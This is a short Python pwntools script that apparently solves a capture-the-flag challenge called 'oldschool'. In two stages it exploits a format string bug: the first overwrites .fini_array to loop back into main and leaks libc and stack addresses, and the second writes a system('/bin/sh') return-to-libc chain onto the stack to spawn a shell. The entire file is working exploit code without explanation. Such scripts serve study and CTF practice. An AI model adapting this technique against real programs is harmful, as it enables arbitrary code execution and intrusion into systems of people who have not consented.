#!/usr/bin/env python3
from bu6pwn.FSB import FSB
from pwn import *

HOST = "127.0.0.1"
PORT = 1337

context.log_level="INFO"

addr_main       = 0x0804849b
addr_fini_arr   = 0x080496dc

exploit = b'%2$08x%264$08x'

fsb = FSB(header=len(exploit),count=16, size=2, debug=False)
fsb.set_adrval(addr_fini_arr, addr_main)
fsb.auto_write(index=7)
exploit += fsb.get()
print("FSB: {}".format(exploit))

s=process("/home/cr0c0/Desktop/oldschool/oldschool")
pause()
s.sendline(exploit)
garbage=s.recv(1024)
libc_leak = int(garbage[:38].decode().split(":")[2][:8], 16)
stack_leak = int(garbage[:38].decode().split(":")[2][8:], 16)-4
log.info("{} {:#x}".format("Stack".ljust(20), stack_leak))
log.info("{} {:#x}".format("Libc".ljust(20), libc_leak))

addr_system = libc_leak - 1686144
addr_binsh = libc_leak - 375574

log.info("{} {:#x}".format("System".ljust(20), addr_system))
log.info("{} {:#x}".format("Binsh".ljust(20), addr_binsh))

# Stage 2
fsb = FSB(size=2, debug=True)
fsb.set_adrval(stack_leak, addr_system)
fsb.set_adrval(stack_leak+0x4, 0x42424242)
fsb.set_adrval(stack_leak+0x8, addr_binsh)
fsb.auto_write(index=7)

s.sendline(fsb.get())
s.close()
